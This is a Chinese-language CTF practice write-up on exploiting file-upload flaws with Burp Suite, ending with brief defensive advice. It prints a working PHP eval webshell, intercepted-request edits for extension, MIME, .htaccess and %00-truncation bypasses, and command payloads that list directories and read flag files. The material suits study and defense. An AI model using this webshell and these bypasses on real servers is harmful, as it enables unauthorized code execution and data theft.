【微方法论】Burp Suite 文件上传漏洞基础利用手法小结

操作者：何芊宏 | 操作日期：2026.9.19 | 分类：Web安全 | 标签：文件上传, BurpSuite社区版, 方法论, WebShell

1. 简介与核心逻辑

文件上传漏洞的本质，是攻击者通过上传包含恶意代码的脚本文件（如 PHP、JSP、ASP），并通过访问该文件来执行系统命令或读取敏感信息。而 Burp Suite (简称 BP) 是绕过各类服务端/客户端校验、实现精确攻击的“瑞士军刀”。

本文是对 CTFHub 文件上传技能树实战经验的小结。本文所有操作均基于 Burp Suite 社区版 (Community Edition) 完成。

关于工具使用的特别说明：
1. 浏览器选择：理论上，只要给浏览器配置了 BP 的代理（通常为 127.0.0.1:8080），使用任何浏览器都能抓包。但本人还未安装代理插件（如 SwitchyOmega），而且不想折腾系统代理设置，于是直接使用了 Burp Suite 自带的浏览器（Burp's built-in browser）。它自带代理配置，无需额外设置。
2. 社区版注意事项：BP 社区版完全免费且包含 Proxy、Repeater 等核心功能，足以应对文件上传漏洞的练习。但社区版默认是“临时项目（Temporary Project）”，建议做题时不要随意关闭 BP，以防抓包记录丢失。同时，社区版修改请求体后，偶尔无法准确自动更新 Content-Length 长度，因此推荐手动计算长度。

2. 通用攻击流程（Burp Suite 社区版）

第一步：环境与木马准备

  • 在本地 muma 文件夹创建一个 PHP 木马文件。建议内容为：GIF89a\n<?php @eval($_POST['cmd']); ?>（首行的 GIF89a 是万能图片头，用于后续绕过文件头检查）。
  • 避坑：由于本地杀毒软件（如 Windows Defender）会拦截 PHP 木马（比如我在桌面上建了个叫muma的文件夹），必须提前将 muma 文件夹加入杀软白名单。
  • 打开 Burp Suite 社区版，点击顶部菜单 Proxy -> Intercept，确保按钮显示为 Intercept is on（拦截开启）。
  • 点击 BP 界面右上角的 Open browser 按钮，此时会弹出一个带有 Burp 标志的浏览器。以后所有的访问、点击上传操作，都在这一个 BP 自带浏览器里完成。

第二步：初始上传与抓包（改后缀/改类型）

  1. 在 BP 自带浏览器 的地址栏输入靶场 URL，并在网页上点击“选择文件”，选中我们的 shell.php。如果网页前端弹窗报错“不允许 PHP 文件”，就在本地将文件重命名为 shell.jpg 后再上传，以此骗过前端 JS。
  2. 点击 Submit 后，BP 自带浏览器会转圈。切回 BP 界面，点击 Proxy -> Intercept，此时能看到抓到的 POST 请求。
  3. 在请求框中找到文件块信息： 
    ------WebKitFormBoundary...
Content-Disposition: form-data; name="file"; filename="shell.jpg"
Content-Type: application/x-php
  4. 按需修改此处：
    • 后缀绕过（前端验证关）：将 filename="shell.jpg" 改回 filename="shell.php"。
    • MIME 绕过（MIME绕过关）：将下方文件块中的 Content-Type: application/x-php 改为 Content-Type: image/gif。
  5. 点击橙色的 Forward 放行。BP 自带浏览器上的网页会提示“上传成功”，记录返回的路径（如 upload/shell.php）。

第三步：Repeater 连马（发送命令，避开 400 报错）

  1. 点击 BP 的 Proxy -> HTTP history，在历史记录中找到刚才上传成功的那个 POST 请求，右键点击它，选择 Send to Repeater（或者按快捷键 Ctrl + R）。
  2. 点击顶部的 Repeater 标签页，进入重放界面。
  3. 修改第一行 URL：POST /upload/shell.php HTTP/1.1。
  4. 找到第 7 行左右的 Content-Type: multipart/form-data;...，将其修改为：Content-Type: application/x-www-form-urlencoded。
  5. 鼠标选中下方所有的 ------WebKitFormBoundary... 及残留的文件内容，按键盘的 Delete 键全部清空。
  6. 在清空的位置，输入命令：cmd=system("ls /");
  7. 将第 3 行的 Content-Length: 326 改成 Content-Length: 19（因为 cmd=system("ls /"); 刚好是 19 个字符）。社区版特别提醒：请务必手动修改，不要依赖 BP 自动计算，否则很容易报 400 错误。
  8. 关键检查：确认请求头最后一行（如 Connection: keep-alive）和请求体（cmd=...）之间，有一个空行。然后点击 Send。

第四步：全盘搜索与读取 Flag（连招）

  1. 如果 ls / 成功回显（如 bin、etc），将请求体替换为：cmd=system("find / -name flag* 2>/dev/null");（长度 45），点击 Send 获取目标路径（如 /var/www/html/flag_xxx.php）。
  2. 拿到路径后，放弃易失效的 cat 命令，改用 PHP 原生函数读取：
    cmd=print_r(file_get_contents('/var/www/html/flag_xxx.php'));
    （注意路径两边必须加单引号，并根据实际路径重新计算 Content-Length，点击 Send 即可拿到 Flag）。

3. 常见校验机制与绕过汇总（实战 + 资料总结）

已实战过关的机制：前端验证、MIME绕过、文件头检查、.htaccess...
资料总结：由于当前平台缺少对应实战环境，以下技巧是查阅资料后整理的原理与操作步骤，仅供后续参考。

  • 无验证（已实战）：直接上传 shell.php，不做任何修改即可放行。
  • 前端验证（已实战）：本地重命名为 .jpg 上传，BP 拦截后改回 .php。
  • MIME绕过（已实战）：修改请求体中的 Content-Type 为 image/gif 或 image/jpeg。
  • 文件头检查（已实战）：木马文件内容开头加入 GIF89a 等魔数。
  • .htaccess（已实战）：先上传 .htaccess 文件（内容为 AddType application/x-httpd-php .jpg），再上传 shell.jpg，使 JPG 被解析为 PHP。
  • 后缀大小写绕过（资料总结）：如果 WAF 黑名单只过滤了小写 .php，可以将文件名改为 shell.PHP 或 shell.Php。Windows 系统不区分大小写，但 Linux 会解析后缀为 PHP 并执行。
  • 双写后缀（资料总结）：如果代码把 php 替换为空字符串，我们可以命名文件为 shell.pphphp。代码过滤掉中间的 php 后，剩下的字符串重新拼接为 shell.php。
  • 点绕过 / 空格绕过（资料总结）：利用 Windows 系统会自动删除文件名末尾的点和空格的特性。如果将文件命名为 shell.php. 或 shell.php ，WAF 检测后缀为点或空格会放行，传到 Windows 服务器后，末尾的点/空格被自动去掉，变回 shell.php。也可利用 shell.php::$DATA（NTFS 数据流特性）。
  • 00截断（资料总结 + 真实踩坑）：
    • 原理：针对 PHP 5.2.0 及以下版本。C 语言底层字符串遇到空字节 %00 会认为字符串结束。如果服务器保存路径时拼接了随机字符（如 $des = $_GET['road'] . "/" . rand(10,99) . date("YmdHis") . "." . $ext;），构造 %00 截断可以保留我们指定的文件名，丢弃后面的随机字符。
    • 真实踩坑：我曾在之前的题目中尝试用 Python 脚本自动化处理，但 Python 的 requests 库会自动将 URL 中的 %00 转义为 %2500，导致截断失效。
    • 解决办法：必须使用 Burp Suite 拦截请求。切到 Raw 视图，将第一行修改为：
      POST /?road=/var/www/html/upload/shell.php%00 HTTP/1.1
      修改完成后放行，再访问 /upload/shell.php 即可成功执行。
  • 突破 getimagesize() / exif_imagetype()（资料总结）：这两个函数要求文件必须是真实的图片结构。不仅开头要有魔数，还要有图片的长宽等。需要将 PHP 代码插入到真实图片的末尾，或者使用图马合成工具。
  • 二次渲染（资料总结）：最狠的防线。服务器把图片用图像库（如 GD）重新生成一张新图片，PHP 代码会被洗掉。绕过思路是分析图片的十六进制结构，将代码写入到不被图像处理库改变的区域（如 IDAT 块、注释区）。

4. 踩坑记录与复盘（血泪经验）

  • 浏览器抓不到包的问题：如果使用自己电脑的 Chrome/Edge 等浏览器（Open Browser）去上传文件，但没有给浏览器配置代理插件（如 SwitchyOmega），或者没有设置系统代理，BP 的 Proxy 模块是抓不到任何数据包的。解决办法要么是配置好代理，要么直接使用 BP 自带的 Open Browser 内置浏览器。
  • 400 Bad Request 泥潭（Content-Length 陷阱）：手动修改 POST 请求体后，必须精准计算 Content-Length。社区版 BP 自动计算有时会出错，建议手动计算。若不确定，可使用 BP 的 Pretty 视图添加参数，让工具自动填充长度。切记 Header 和 Body 之间必须且只能有一个空行。
  • GET 与 POST 混淆：木马代码写的是 $_POST['cmd']，必须在 Repeater 中使用 POST 方式发送数据，绝不能图省事在浏览器地址栏拼 URL。
  • 禁用函数与 Native 函数替代：沙盒环境常禁用 cat 等系统命令（表现为无回显）。此时必须使用 PHP 内置文件读取函数 print_r(file_get_contents(...)) 替代。
  • 盲改 Content-Type 的“净化”陷阱：在“文件头检查”关，若盲目将 Content-Type 改为 image/jpeg，可能导致服务端调用图像库把 PHP 代码洗掉。推荐使用 image/gif 或不修改该字段。
  • 命令字符的极致严谨：Linux 命令对空格敏感，find / -name flag* 漏打空格会导致命令失效。每次输入命令后，建议对照文档确认一遍。

5. 知识总结

  • 攻击链的核心：文件上传漏洞利用的核心在于“欺骗”。欺骗前端JS、欺骗MIME检查、欺骗文件头检查，最终目的都是让恶意脚本落地并具备执行权限。
  • 防御策略：服务端绝对不能信任客户端任何数据。必须进行严格的白名单后缀校验（统一转小写）、MIME校验、文件内容检测。最核心的防御手段是将上传目录的执行权限剥离（设为不可执行），无论什么后缀都无法执行，这才是安全的底线。
